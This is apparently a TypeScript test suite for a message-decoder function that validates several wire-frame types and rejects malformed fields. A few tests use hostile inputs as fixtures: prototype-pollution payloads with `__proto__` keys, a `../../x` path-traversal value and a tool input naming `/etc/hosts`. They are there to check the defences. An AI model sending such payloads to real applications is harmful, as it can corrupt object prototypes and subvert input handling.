    // top level (trap 3: `dropped_tasks` is the roster's only truncation report) — plus a spurious
    // `turn_id`, which this frame never carries either.
    const withExtras = {
      ...BACKGROUND_TASK_ROSTER,
      truncated_fields: ['tasks'],
      turn_id: 'turn-1'
    }
    expect(parseInboundMessage(encodeBackgroundTaskRoster(withExtras))).toEqual({
      kind: 'background-task-roster',
      backgroundTaskRoster: BACKGROUND_TASK_ROSTER
    })
  })

  it('drops unknown server keys at the ROW level, keeping exactly the four known fields (AC4)', () => {
    // The pointed extras are the SCALAR siblings' fields, which a roster row must never have and must
    // not ride through — the regression test for a row narrower wrongly cloned from
    // parseBackgroundTaskStartedPayload.
    const withRowExtras = {
      ...BACKGROUND_TASK_ROSTER,
      tasks: [
        {
          ...BACKGROUND_TASK_ROSTER.tasks[0],
          tool_call_id: 'toolu_01XYZ',
          patch: '{"is_backgrounded":tr'
        }
      ]
    }
    expect(parseInboundMessage(encodeBackgroundTaskRoster(withRowExtras))).toEqual({
      kind: 'background-task-roster',
      backgroundTaskRoster: {
        ...BACKGROUND_TASK_ROSTER,
        tasks: [BACKGROUND_TASK_ROSTER.tasks[0]]
      }
    })
  })

  it('still returns null for a well-formed envelope of another unmodeled type (no widening)', () => {
    const bytes = encodeEnvelope({ id: 1, type: 'ack', ts: FIXED_TS, payload: {} })
    expect(parseInboundMessage(bytes)).toBeNull()
  })
})

describe('parseInboundMessage — background_task_roster fail-closed (#566)', () => {
  it('throws when tasks is null — the trap: a ROW truncated_fields null is a VALUE, this is not', () => {
    // THE asymmetry, in one frame. `Array.isArray(null)` is `false`, which is what makes this fail
    // closed; the per-row `truncated_fields: null` above decodes to `null` and is preserved. The
    // daemon settles it: BackgroundTaskRosterPayload carries interactive.go's ONLY custom MarshalJSON,
    // whose whole job is normalising a nil Tasks to [] so an empty roster never serialises as null.
    const payload = { ...BACKGROUND_TASK_ROSTER, tasks: null }
    expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(WireDecodeError)
  })

  it('throws when the tasks key is OMITTED — an absence is not an empty roster (AC2)', () => {
    const payload: Record<string, unknown> = { ...BACKGROUND_TASK_ROSTER }
    delete payload.tasks
    expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(WireDecodeError)
  })

  it('throws when tasks is any non-array (AC2)', () => {
    const bad: unknown[] = ['x', 7, {}, true]
    for (const value of bad) {
      const payload = { ...BACKGROUND_TASK_ROSTER, tasks: value }
      expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when conversation_id is absent or a non-string (AC4)', () => {
    const missing: Record<string, unknown> = { ...BACKGROUND_TASK_ROSTER }
    delete missing.conversation_id
    expect(() => parseInboundMessage(encodeBackgroundTaskRoster(missing))).toThrow(WireDecodeError)
    for (const value of [42, null, { a: 1 }]) {
      const payload = { ...BACKGROUND_TASK_ROSTER, conversation_id: value }
      expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when dropped_tasks is OMITTED — an absence is not a zero (AC3)', () => {
    // Paired with the `dropped_tasks: 0` case above, this is what distinguishes required-may-be-zero
    // from optional: the Go field has no `omitempty`, so the key is always on the wire and an absent
    // key is a real defect.
    const payload: Record<string, unknown> = { ...BACKGROUND_TASK_ROSTER }
    delete payload.dropped_tasks
    expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(WireDecodeError)
  })

  it('throws when dropped_tasks arrives as a JSON string, never coercing it (AC3/AC4)', () => {
    // requireNumber checks typeof === 'number', so '3' fails closed rather than being coerced — the
    // mistyped-counter case, mirroring parseQueuedItem's queued_msg_id posture.
    for (const value of ['3', null, true, {}]) {
      const payload = { ...BACKGROUND_TASK_ROSTER, dropped_tasks: value }
      expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(WireDecodeError)
    }
  })

  it('fails the WHOLE frame closed when any single row is not a record (AC4)', () => {
    // Row 1 is valid; the second row is not. Nothing partial is returned — the point is that row 1
    // does not survive.
    for (const badRow of ['not-an-object', 7, null, ['nested']]) {
      const payload = { ...BACKGROUND_TASK_ROSTER, tasks: [BACKGROUND_TASK_ROSTER.tasks[0], badRow] }
      expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when any per-row required string is absent — one bad row fails the frame (AC4)', () => {
    for (const field of ['task_id', 'task_type', 'description'] as const) {
      const row: Record<string, unknown> = { ...BACKGROUND_TASK_ROSTER.tasks[0] }
      delete row[field]
      const payload = { ...BACKGROUND_TASK_ROSTER, tasks: [BACKGROUND_TASK_ROSTER.tasks[1], row] }
      expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when any per-row required string is a non-string (AC4)', () => {
    for (const field of ['task_id', 'task_type', 'description'] as const) {
      for (const value of [42, null, { a: 1 }]) {
        const row = { ...BACKGROUND_TASK_ROSTER.tasks[0], [field]: value }
        const payload = { ...BACKGROUND_TASK_ROSTER, tasks: [row] }
        expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(
          WireDecodeError
        )
      }
    }
  })

  it('throws when a row truncated_fields key is OMITTED — an absence is not a null (AC4)', () => {
    const row: Record<string, unknown> = { ...BACKGROUND_TASK_ROSTER.tasks[0] }
    delete row.truncated_fields
    const payload = { ...BACKGROUND_TASK_ROSTER, tasks: [row] }
    expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(WireDecodeError)
  })

  it('throws when a row truncated_fields is neither an array nor null (AC4)', () => {
    for (const value of ['description', 7, { description: true }, true]) {
      const row = { ...BACKGROUND_TASK_ROSTER.tasks[0], truncated_fields: value }
      const payload = { ...BACKGROUND_TASK_ROSTER, tasks: [row] }
      expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when a row truncated_fields holds a non-string element — one bad element fails the whole frame', () => {
    const bad: unknown[] = [['description', 7], [null], [{ name: 'description' }], [['nested']]]
    for (const value of bad) {
      const row = { ...BACKGROUND_TASK_ROSTER.tasks[0], truncated_fields: value }
      const payload = { ...BACKGROUND_TASK_ROSTER, tasks: [row] }
      expect(() => parseInboundMessage(encodeBackgroundTaskRoster(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when a background_task_roster payload is not an object (AC4)', () => {
    expect(() => parseInboundMessage(encodeBackgroundTaskRoster('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeBackgroundTaskRoster(['a']))).toThrow(WireDecodeError)
  })

  it('throws on an oversized background_task_roster plaintext even when the JSON is valid', () => {
    // No per-row or per-roster count/length check exists here by design — the frame-level guard is the
    // client's bound, and a client-side mirror of the daemon's entry cap would fail-close a valid
    // future frame the day the daemon raises it.
    const bytes = new TextEncoder().encode(
      JSON.stringify({
        id: 28,
        type: 'background_task_roster',
        ts: FIXED_TS,
        payload: {
          conversation_id: 'c1',
          tasks: [
            {
              task_id: 'task_01ABC',
              task_type: 'local_bash',
              description: 'x'.repeat(MAX_PLAINTEXT_BYTES),
              truncated_fields: null
            }
          ],
          dropped_tasks: 0
        }
      })
    )
    expect(bytes.length).toBeGreaterThan(MAX_PLAINTEXT_BYTES)
    expect(() => parseInboundMessage(bytes)).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — unrecognized_message recognition', () => {
  it('narrows a full unrecognized_message into { kind: unrecognized-message } carrying all five fields', () => {
    const result = parseInboundMessage(encodeUnrecognized(UNRECOGNIZED))
    expect(result).toEqual({ kind: 'unrecognized-message', unrecognized: UNRECOGNIZED })
  })

  it('accepts every one of the four drop sites', () => {
    for (const site of ['line_type', 'assistant_block', 'user_block', 'undecodable']) {
      const result = parseInboundMessage(encodeUnrecognized({ ...UNRECOGNIZED, site }))
      expect(result).toMatchObject({ kind: 'unrecognized-message', unrecognized: { site } })
    }
  })

  it('accepts an EMPTY message_type — the undecodable site read no type at all', () => {
    const payload = { ...UNRECOGNIZED, site: 'undecodable', message_type: '' }
    const result = parseInboundMessage(encodeUnrecognized(payload))
    expect(result).toMatchObject({ unrecognized: { message_type: '', site: 'undecodable' } })
  })

  it('accepts truncated true — a cut blob is the case the flag exists for', () => {
    const payload = { ...UNRECOGNIZED, raw: '{"type":"huge","blob":"xxx', truncated: true }
    const result = parseInboundMessage(encodeUnrecognized(payload))
    expect(result).toMatchObject({ unrecognized: { truncated: true } })
  })

  it('carries raw verbatim, never parsing or re-serializing it', () => {
    // A truncated blob is not valid JSON, so any attempt to round-trip it as JSON would throw.
    // Carrying it as an opaque string is what makes the diagnostic survivable.
    const raw = '{"type":"huge_event","blob":"aaaa'
    const result = parseInboundMessage(encodeUnrecognized({ ...UNRECOGNIZED, raw, truncated: true }))
    expect(result).toMatchObject({ unrecognized: { raw } })
  })

  it('tolerates but does not copy an unknown server-added key', () => {
    const result = parseInboundMessage(
      encodeUnrecognized({ ...UNRECOGNIZED, turn_id: 'must-not-cross' })
    )
    expect(result).toEqual({ kind: 'unrecognized-message', unrecognized: UNRECOGNIZED })
    expect(JSON.stringify(result)).not.toContain('must-not-cross')
  })
})

describe('parseInboundMessage — unrecognized_message fail-closed', () => {
  it('throws when site is absent, unknown, or a non-string (closed enum, not requireString)', () => {
    const bad: unknown[] = [
      { ...UNRECOGNIZED, site: undefined },
      { ...UNRECOGNIZED, site: 'a_site_invented_later' },
      { ...UNRECOGNIZED, site: '' },
      { ...UNRECOGNIZED, site: 42 },
      { ...UNRECOGNIZED, site: null }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeUnrecognized(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when conversation_id is absent, a non-string, or null', () => {
    const bad: unknown[] = [
      { ...UNRECOGNIZED, conversation_id: undefined },
      { ...UNRECOGNIZED, conversation_id: 42 },
      { ...UNRECOGNIZED, conversation_id: null }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeUnrecognized(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when message_type is absent or a non-string — empty is fine, missing is not', () => {
    const bad: unknown[] = [
      { ...UNRECOGNIZED, message_type: undefined },
      { ...UNRECOGNIZED, message_type: 42 },
      { ...UNRECOGNIZED, message_type: null }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeUnrecognized(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when raw is absent or a non-string — never coerced, never defaulted', () => {
    const bad: unknown[] = [
      { ...UNRECOGNIZED, raw: undefined },
      { ...UNRECOGNIZED, raw: { type: 'some_future_event' } },
      { ...UNRECOGNIZED, raw: 42 },
      { ...UNRECOGNIZED, raw: null }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeUnrecognized(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when truncated is absent or a non-boolean (TYPE-checked, never truthiness)', () => {
    const bad: unknown[] = [
      { ...UNRECOGNIZED, truncated: undefined },
      { ...UNRECOGNIZED, truncated: 'false' },
      { ...UNRECOGNIZED, truncated: 0 },
      { ...UNRECOGNIZED, truncated: 1 },
      { ...UNRECOGNIZED, truncated: null }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeUnrecognized(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when an unrecognized_message payload is not an object', () => {
    expect(() => parseInboundMessage(encodeUnrecognized('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeUnrecognized(['a']))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeUnrecognized(null))).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — tool_use recognition (#217, additive)', () => {
  it('narrows a full tool_use into { kind: tool-use } carrying all five fields verbatim', () => {
    expect(parseInboundMessage(encodeToolUse(TOOL_USE))).toEqual({
      kind: 'tool-use',
      toolUse: TOOL_USE
    })
  })

  it('drops unknown server keys, keeping only the five known tool_use fields (forward-compat)', () => {
    const withExtras = { ...TOOL_USE, raw_input: '{"path":"/etc/hosts"}', extra: 'ignore-me' }
    expect(parseInboundMessage(encodeToolUse(withExtras))).toEqual({
      kind: 'tool-use',
      toolUse: TOOL_USE
    })
  })

  it('still routes a message to its existing kind (additive, unchanged)', () => {
    expect(parseInboundMessage(encodeMessage(MSG))).toEqual({ kind: 'message', message: MSG })
  })
})

describe('parseInboundMessage — tool_use fail-closed (#217)', () => {
  it('throws when any single field is absent (never a partial)', () => {
    for (const field of ['conversation_id', 'turn_id', 'tool_use_id', 'name', 'input_summary'] as const) {
      const { [field]: _dropped, ...missing } = TOOL_USE
      expect(() => parseInboundMessage(encodeToolUse(missing))).toThrow(WireDecodeError)
    }
  })

  it('throws when any single field is a non-string (number, object, null)', () => {
    const bad: unknown[] = [
      { ...TOOL_USE, name: 42 },
      { ...TOOL_USE, input_summary: {} },
      { ...TOOL_USE, tool_use_id: null },
      { ...TOOL_USE, turn_id: ['a'] },
      { ...TOOL_USE, conversation_id: 7 }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeToolUse(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when a tool_use payload is not an object', () => {
    expect(() => parseInboundMessage(encodeToolUse('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeToolUse(['a']))).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — tool_use input (#642)', () => {
  /** Decode a tool_use frame and hand back its narrowed payload — the union narrowing the field-level
   *  assertions below need. Throws (failing the test) on any other kind. */
  function decodeToolUse(payload: unknown): ToolUsePayload {
    const result = parseInboundMessage(encodeToolUse(payload))
    if (result?.kind !== 'tool-use') {
      throw new Error(`expected a tool-use, got ${String(result?.kind)}`)
    }
    return result.toolUse
  }

  it('narrows a populated input map through with its entries unchanged', () => {
    expect(parseInboundMessage(encodeToolUse(TOOL_USE_WITH_INPUT))).toEqual({
      kind: 'tool-use',
      toolUse: TOOL_USE_WITH_INPUT
    })
  })

  it('decodes an empty input object as an EMPTY MAP, never as absent (AC1)', () => {
    // "This daemon sent no fields for this call" and "this daemon cannot send fields at all" are
    // different facts. A careless `if (!value) return undefined` collapses them; this is the pin.
    const toolUse = decodeToolUse({ ...TOOL_USE, input: {} })
    expect(toolUse.input).toEqual({})
    expect(toolUse.input).toBeDefined()
  })

  it('decodes an OMITTED input key as undefined, the other five fields normal (pre-#1678 daemon)', () => {
    const toolUse = decodeToolUse(TOOL_USE)
    expect(toolUse.input).toBeUndefined()
    expect(toolUse).toEqual(TOOL_USE)
  })

  it('throws on a literal null input — the value requireStringOrNull would have ACCEPTED', () => {
    expect(() => parseInboundMessage(encodeToolUse({ ...TOOL_USE, input: null }))).toThrow(
      WireDecodeError
    )
  })

  it('throws when input is present but not an object (array, string, number, boolean)', () => {
    for (const input of [['a'], 'nope', 42, true]) {
      expect(() => parseInboundMessage(encodeToolUse({ ...TOOL_USE, input }))).toThrow(
        WireDecodeError
      )
    }
  })

  it('throws the WHOLE frame when any input value is a non-string — never a partial map (AC2)', () => {
    const bad: Record<string, unknown>[] = [
      { a: 1 },
      { a: null },
      { a: {} },
      { a: ['x'] },
      { a: true }
    ]
    for (const input of bad) {
      // Each carries a well-formed sibling: the frame must still throw rather than decode through
      // with `{ good: 'kept' }` and the bad entry quietly skipped.
      expect(() =>
        parseInboundMessage(encodeToolUse({ ...TOOL_USE, input: { ...input, good: 'kept' } }))
      ).toThrow(WireDecodeError)
    }
  })

  it('drops the three reserved keys, leaving prototypes unmodified (AC3, carry path)', () => {
    // Built through JSON.parse: an object LITERAL's `__proto__` sets the prototype instead of
    // creating the own property the wire actually delivers.
    const input = JSON.parse(
      '{"__proto__":"x","constructor":"y","prototype":"z","path":"/etc/hosts"}'
    )
    const toolUse = decodeToolUse({ ...TOOL_USE, input })

    expect(toolUse.input).toEqual({ path: '/etc/hosts' })
    expect(Object.keys(toolUse.input ?? {})).toEqual(['path'])
    expect(Object.getPrototypeOf(toolUse.input)).toBe(Object.prototype)
    // Nothing landed on the shared prototype: a freshly-created object is untouched.
    const probe = {} as Record<string, unknown>
    expect(Object.getPrototypeOf(probe)).toBe(Object.prototype)
    expect(probe.constructor).toBe(Object)
    expect(Object.values(probe)).toEqual([])
  })

  it('throws on an object-valued reserved key — the type check runs BEFORE the skip (AC3, throw path)', () => {
    const input = JSON.parse('{"__proto__":{"polluted":true}}')
    expect(() => parseInboundMessage(encodeToolUse({ ...TOOL_USE, input }))).toThrow(WireDecodeError)
    const probe = {} as Record<string, unknown>
    expect(probe.polluted).toBeUndefined()
  })

  it('names the failure CATEGORY only — no daemon key and no value reaches the message (AC4)', () => {
    const SECRET_KEY = 'secret-field-name'
    const SECRET_VALUE = 'secret-field-value'
    const cases: unknown[] = [
      { [SECRET_KEY]: 42 },
      { [SECRET_KEY]: { nested: SECRET_VALUE } },
      [SECRET_VALUE],
      SECRET_VALUE
    ]
    for (const input of cases) {
      let caught: unknown
      try {
        parseInboundMessage(encodeToolUse({ ...TOOL_USE, input }))
      } catch (error) {
        caught = error
      }
      expect(caught).toBeInstanceOf(WireDecodeError)
      const { message } = caught as WireDecodeError
      // A NEW category, not `missing required field:` — for an optional field that message is
      // actively misleading, since an absent key is the one case that does NOT throw.
      expect(message).toBe('malformed optional field: input')
      expect(message).not.toContain(SECRET_KEY)
      expect(message).not.toContain(SECRET_VALUE)
    }
  })
})

describe('parseInboundMessage — tool_result recognition (#229, additive)', () => {
  it('narrows a full tool_result into { kind: tool-result } carrying all five fields verbatim', () => {
    expect(parseInboundMessage(encodeToolResult(TOOL_RESULT))).toEqual({
      kind: 'tool-result',
      toolResult: TOOL_RESULT
    })
  })

  it('decodes is_error:false as the value false, never as absent (the yolo #180 idiom)', () => {
    const success = { ...TOOL_RESULT, is_error: false }
    expect(parseInboundMessage(encodeToolResult(success))).toEqual({
      kind: 'tool-result',
      toolResult: success
    })
  })

  it('decodes is_error:true as the value true (an errored tool)', () => {
    const failed = { ...TOOL_RESULT, is_error: true, result_summary: 'permission denied' }
    expect(parseInboundMessage(encodeToolResult(failed))).toEqual({
      kind: 'tool-result',
      toolResult: failed
    })
  })

  it('decodes an empty result_summary as the value "", never as absent', () => {
    const empty = { ...TOOL_RESULT, result_summary: '' }
    expect(parseInboundMessage(encodeToolResult(empty))).toEqual({
      kind: 'tool-result',
      toolResult: empty
    })
  })

  it('drops unknown server keys, keeping only the five known tool_result fields (forward-compat)', () => {
    const withExtras = { ...TOOL_RESULT, raw_output: '{"lines":12}', extra: 'ignore-me' }
    expect(parseInboundMessage(encodeToolResult(withExtras))).toEqual({
      kind: 'tool-result',
      toolResult: TOOL_RESULT
    })
  })

  it('still routes a message to its existing kind (additive, unchanged)', () => {
    expect(parseInboundMessage(encodeMessage(MSG))).toEqual({ kind: 'message', message: MSG })
  })
})

describe('parseInboundMessage — tool_result fail-closed (#229)', () => {
  it('throws when any single field is absent (never a partial)', () => {
    for (const field of ['conversation_id', 'turn_id', 'tool_use_id', 'is_error', 'result_summary'] as const) {
      const { [field]: _dropped, ...missing } = TOOL_RESULT
      expect(() => parseInboundMessage(encodeToolResult(missing))).toThrow(WireDecodeError)
    }
  })

  it('throws when any string field is a non-string (number, object, null)', () => {
    const bad: unknown[] = [
      { ...TOOL_RESULT, conversation_id: 7 },
      { ...TOOL_RESULT, turn_id: ['a'] },
      { ...TOOL_RESULT, tool_use_id: null },
      { ...TOOL_RESULT, result_summary: {} }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeToolResult(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when is_error is a non-boolean (a "true"/"false" string, number, null, object)', () => {
    const bad: unknown[] = [
      { ...TOOL_RESULT, is_error: 'true' }, // the string, not the boolean — a truthiness check would accept it
      { ...TOOL_RESULT, is_error: 'false' },
      { ...TOOL_RESULT, is_error: 1 },
      { ...TOOL_RESULT, is_error: 0 },
      { ...TOOL_RESULT, is_error: null },
      { ...TOOL_RESULT, is_error: {} }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeToolResult(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when a tool_result payload is not an object', () => {
    expect(() => parseInboundMessage(encodeToolResult('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeToolResult(['a']))).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — tool_result result_detail (#773, optional scalar)', () => {
  /** Decode one tool_result payload, asserting the kind so the caller reads a typed payload. */
  function decodeToolResult(payload: unknown): ToolResultPayload {
    const result = parseInboundMessage(encodeToolResult(payload))
    if (result?.kind !== 'tool-result') {
      throw new Error(`expected a tool-result, got ${String(result?.kind)}`)
    }
    return result.toolResult
  }

  it('carries a value with unit words and interior spaces through BYTE-IDENTICAL (AC4)', () => {
    // The unit words are on the wire on purpose — a client cannot tell a read from a search without
    // switching on a tool name. Nothing on this path parses, trims, or extracts a number.
    const detail = '110 of 1676 lines'
    expect(decodeToolResult({ ...TOOL_RESULT, result_detail: detail }).result_detail).toBe(detail)
  })

  it('decodes the PRE-FEATURE payload (no result_detail key) without error, leaving it absent (AC2)', () => {
    // TOOL_RESULT predates pyrycode#2024 and carries no `result_detail` — a daemon built before the
    // field existed. The contract is `=== undefined`, never `'result_detail' in payload`.
    const decoded = decodeToolResult(TOOL_RESULT)
    expect(decoded.result_detail).toBeUndefined()
    expect(decoded).toEqual(TOOL_RESULT)
  })

  it('decodes an empty result_detail as the value "", never collapsing it into absent (AC3)', () => {
    expect(decodeToolResult({ ...TOOL_RESULT, result_detail: '' }).result_detail).toBe('')
  })

  it('throws on a present non-string result_detail — the WHOLE payload, never a silent drop (AC2)', () => {
    const bad: unknown[] = [null, 42, 0, {}, ['265 lines'], true]
    for (const result_detail of bad) {
      expect(() => parseInboundMessage(encodeToolResult({ ...TOOL_RESULT, result_detail }))).toThrow(
        WireDecodeError
      )
    }
  })

  it('names the failure CATEGORY only — no daemon-supplied value reaches the message', () => {
    const SECRET_VALUE = 'secret-result-detail'
    let caught: unknown
    try {
      parseInboundMessage(encodeToolResult({ ...TOOL_RESULT, result_detail: [SECRET_VALUE] }))
    } catch (error) {
      caught = error
    }
    expect(caught).toBeInstanceOf(WireDecodeError)
    const { message } = caught as WireDecodeError
    // The optional-field category (#642's), not `missing required field:` — for an optional field
    // that message is actively misleading, since an absent key is the one case that does NOT throw.
    expect(message).toBe('malformed optional field: result_detail')
    expect(message).not.toContain(SECRET_VALUE)
  })
})

describe('parseInboundMessage — queue_state recognition (#292, additive)', () => {
  it('narrows a full queue_state into { kind: queue-state } carrying the ordered backlog verbatim', () => {
    expect(parseInboundMessage(encodeQueueState(QUEUE_STATE))).toEqual({
      kind: 'queue-state',
      queueState: QUEUE_STATE
    })
  })

  it('preserves per-item queued_msg_id (as a number), text, and ts in enqueue order (AC2)', () => {
    const result = parseInboundMessage(encodeQueueState(QUEUE_STATE))
    expect(result?.kind).toBe('queue-state')
    if (result?.kind === 'queue-state') {
      expect(result.queueState.conversation_id).toBe('conv-1')
      expect(result.queueState.queued.map((q) => q.queued_msg_id)).toEqual([1, 2])
      // queued_msg_id decodes as a number, never a string (AC1).
      expect(typeof result.queueState.queued[0].queued_msg_id).toBe('number')
      expect(result.queueState.queued.map((q) => q.text)).toEqual(['first queued', 'second queued'])
      expect(result.queueState.queued[0].ts).toBe('2026-07-10T00:00:00Z')
    }
  })

  it('treats an empty queued array as a valid zero-length backlog — not null, not an error (AC3)', () => {
    expect(parseInboundMessage(encodeQueueState({ conversation_id: 'conv-1', queued: [] }))).toEqual({
      kind: 'queue-state',
      queueState: { conversation_id: 'conv-1', queued: [] }
    })
  })

  it('drops unknown server keys per item, keeping only the three known fields (forward-compat)', () => {
    const withExtras = {
      conversation_id: 'conv-1',
      queued: [{ queued_msg_id: 1, text: 'x', ts: 't', priority: 'high', extra: 3 }]
    }
    expect(parseInboundMessage(encodeQueueState(withExtras))).toEqual({
      kind: 'queue-state',
      queueState: { conversation_id: 'conv-1', queued: [{ queued_msg_id: 1, text: 'x', ts: 't' }] }
    })
  })

  it('still routes a message to its existing kind (additive, unchanged)', () => {
    expect(parseInboundMessage(encodeMessage(MSG))).toEqual({ kind: 'message', message: MSG })
  })
})

describe('parseInboundMessage — queue_state fail-closed (#292, AC4)', () => {
  it('throws when a queue_state payload is not an object', () => {
    expect(() => parseInboundMessage(encodeQueueState('nope'))).toThrow(WireDecodeError)
    expect(() => parseInboundMessage(encodeQueueState(['a']))).toThrow(WireDecodeError)
  })

  it('throws when conversation_id is missing or non-string', () => {
    const bad: unknown[] = [
      { queued: [] },
      { conversation_id: 7, queued: [] },
      { conversation_id: null, queued: [] }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeQueueState(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when queued is missing or not an array', () => {
    const bad: unknown[] = [
      { conversation_id: 'conv-1' },
      { conversation_id: 'conv-1', queued: {} },
      { conversation_id: 'conv-1', queued: 'x' },
      { conversation_id: 'conv-1', queued: 3 }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeQueueState(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when a queued_msg_id arrives as a JSON string, never coercing it (AC4)', () => {
    // The load-bearing AC4 case: requireNumber checks typeof === 'number', so the string '7' fails
    // closed rather than being silently accepted. A truthiness or Number()-coerce would let it pass.
    const bad = { conversation_id: 'conv-1', queued: [{ queued_msg_id: '7', text: 'x', ts: 't' }] }
    expect(() => parseInboundMessage(encodeQueueState(bad))).toThrow(WireDecodeError)
  })

  it('throws when any per-item field is missing (never a partial event)', () => {
    for (const field of ['queued_msg_id', 'text', 'ts'] as const) {
      const item = { queued_msg_id: 1, text: 'x', ts: 't' }
      const { [field]: _dropped, ...missing } = item
      const payload = { conversation_id: 'conv-1', queued: [missing] }
      expect(() => parseInboundMessage(encodeQueueState(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws when text or ts is a non-string', () => {
    const bad: unknown[] = [
      { conversation_id: 'conv-1', queued: [{ queued_msg_id: 1, text: 42, ts: 't' }] },
      { conversation_id: 'conv-1', queued: [{ queued_msg_id: 1, text: 'x', ts: null }] }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeQueueState(payload))).toThrow(WireDecodeError)
    }
  })

  it('fails the whole backlog closed when any single item is invalid', () => {
    const bad: unknown[] = [
      { conversation_id: 'conv-1', queued: [{ queued_msg_id: 1, text: 'x', ts: 't' }, 'not-an-object'] },
      { conversation_id: 'conv-1', queued: [{ queued_msg_id: 1, text: 'x', ts: 't' }, { queued_msg_id: '2', text: 'y', ts: 'u' }] }
    ]
    for (const payload of bad) {
      expect(() => parseInboundMessage(encodeQueueState(payload))).toThrow(WireDecodeError)
    }
  })

  it('throws on an oversized queue_state plaintext even when the JSON is valid', () => {
    const bytes = new TextEncoder().encode(
      JSON.stringify({
        id: 21,
        type: 'queue_state',
        ts: FIXED_TS,
        payload: {
          conversation_id: 'conv-1',
          queued: [{ queued_msg_id: 1, text: 'x'.repeat(MAX_PLAINTEXT_BYTES), ts: 't' }]
        }
      })
    )
    expect(bytes.length).toBeGreaterThan(MAX_PLAINTEXT_BYTES)
    expect(() => parseInboundMessage(bytes)).toThrow(WireDecodeError)
  })
})

describe('parseInboundMessage — modal_shown recognition (#201, additive)', () => {
  it('narrows a full modal_shown into { kind: modal-shown } carrying all seven fields verbatim', () => {
    expect(parseInboundMessage(encodeModalShown(MODAL_SHOWN))).toEqual({
      kind: 'modal-shown',
      modalShown: MODAL_SHOWN
    })
  })

  it('preserves option order — options[0] before options[1] (array order is selection order)', () => {
    const result = parseInboundMessage(encodeModalShown(MODAL_SHOWN))
    if (result?.kind === 'modal-shown') {
      expect(result.modalShown.options.map((o) => o.id)).toEqual(['allow', 'deny'])
      expect(result.modalShown.options[0]).toEqual({ id: 'allow', label: 'Allow' })
      expect(result.modalShown.options[1]).toEqual({ id: 'deny', label: 'Deny' })
    }
  })

  it('narrows a full modal_shown for the trust class too', () => {
    const trust = { ...MODAL_SHOWN, class: 'trust' }
    expect(parseInboundMessage(encodeModalShown(trust))).toEqual({
      kind: 'modal-shown',
      modalShown: trust
    })
  })

  it('treats an empty options array as a valid zero-option modal (structural)', () => {
    const empty = { ...MODAL_SHOWN, options: [] }
    expect(parseInboundMessage(encodeModalShown(empty))).toEqual({
      kind: 'modal-shown',
      modalShown: empty
    })
  })

  it('drops unknown server keys, keeping only the seven known fields (forward-compat)', () => {
    // `conversation_id` was this test's example of an unknown key until #870 made it a known one; the
    // forward-compat point stands on `extra` alone.
    const withExtras = { ...MODAL_SHOWN, extra: 'ignore-me' }
    expect(parseInboundMessage(encodeModalShown(withExtras))).toEqual({
      kind: 'modal-shown',
      modalShown: MODAL_SHOWN
    })
  })

  it('carries conversation_id verbatim, never policing its shape or membership (#870)', () => {
    // The decoder narrows type, not membership: no known-conversation set is consulted (that scoping
    // concern is #872's), and no path/shape check is applied — the same posture `default_option_id`
    // already gets for its `∈ options[].id` invariant.
    for (const conversation_id of ['../../x', '', 'conv-7f3a', '__proto__']) {
      const payload = { ...MODAL_SHOWN, conversation_id }
      expect(parseInboundMessage(encodeModalShown(payload))).toEqual({
        kind: 'modal-shown',
        modalShown: payload
      })
    }
  })

  it('drops unknown keys per option, keeping only { id, label } (forward-compat)', () => {
    const withExtras = {
      ...MODAL_SHOWN,
      options: [{ id: 'allow', label: 'Allow', keystroke: '1' }]
    }
    expect(parseInboundMessage(encodeModalShown(withExtras))).toEqual({
      kind: 'modal-shown',
      modalShown: { ...MODAL_SHOWN, options: [{ id: 'allow', label: 'Allow' }] }
    })
  })

  it('still routes a message to its existing kind (additive, unchanged)', () => {
